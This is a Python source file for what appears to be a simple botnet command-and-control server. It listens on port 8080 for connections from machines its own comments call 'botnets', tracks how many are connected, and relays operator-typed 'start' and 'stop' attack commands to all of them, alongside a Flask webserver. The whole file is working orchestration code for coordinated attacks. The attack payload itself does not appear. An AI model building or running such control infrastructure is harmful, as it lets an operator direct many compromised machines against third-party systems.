import socket
import threading
from threading import Event
from time import sleep
from webserver import runServer

active_connections_lock = threading.Lock()
active_connections = 0

# event that can be used to tell all threads to stop running or attacking
stop_event = threading.Event() 
run_attack = threading.Event()


def acceptor(s: socket.socket):
    global active_connections
    while not stop_event.is_set():
        try:
            connection, address = s.accept()
            print("Got connection from ", address)
            with active_connections_lock:
                active_connections += 1
            print("currently handling", active_connections, "connections")
            client_thread = threading.Thread(target=handle_client, args=(connection, address))
            client_thread.start()
        except socket.timeout:  
            # use periodic time outs to check if the user has pressed ctrl+c, 
            # because accept() is a blocking call and it keeps ctrl+c in the queue until it a connection finally comes in
            continue


# function to handle a client connection if any
def handle_client(conn: socket.socket, addr):
    global active_connections
    conn.settimeout(1)
    state = None
    
    while not stop_event.is_set():
        try:
            conn.recv(1024)
        except socket.timeout:
            pass
        except :
            print("")
            print("Client must have disconnected:", addr)
            break
        if run_attack.is_set() and state != "attacking":
            state = "attacking"
            command = "start"
            print("command is ", command.encode())
            conn.send(command.encode())
        elif (not run_attack.is_set()) and state == "attacking":
            state = "stopped"
            command = "stop"
            print("command is ", command.encode())
            conn.send(command.encode())

    conn.close()
    # Decrement the active connection count
    with active_connections_lock:
        active_connections -= 1
        print(active_connections, "connections left")


if __name__ == "__main__":

    # socket creation and initialization
    s = socket.socket()
    print("")
    print("Socket created.")
    s.settimeout(1)
    s.bind(('0.0.0.0', 8080))
    print("Socket binded to 8080")
    print("")

    # listen for any incoming connections from clients
    s.listen(5)
    # start a thread that accepts incoming connections from botnets
    acceptor_thread = threading.Thread(target=acceptor, args=(s,))
    acceptor_thread.start()

    # thread for starting the flask webserver
    flask_thread = threading.Thread(target=runServer ,daemon=True)
    flask_thread.start()

    try:
        while s and not stop_event.is_set():
            if active_connections > 0:
                sleep(1)
                command = input("> ")
                if command == "start":
                    run_attack.set()
                elif command == "stop":
                    run_attack.clear()
            else:
                print("Waiting for connection...", end='\r', flush=True)
                        
    except KeyboardInterrupt:
        # clean everything up once the user presses ctrl+c
        stop_event.set()
        acceptor_thread.join()
        # flask_thread.join()
        print("")
        print("Closing socket...")
        s.close()
        print("Closing server...")
        print("")
        exit()       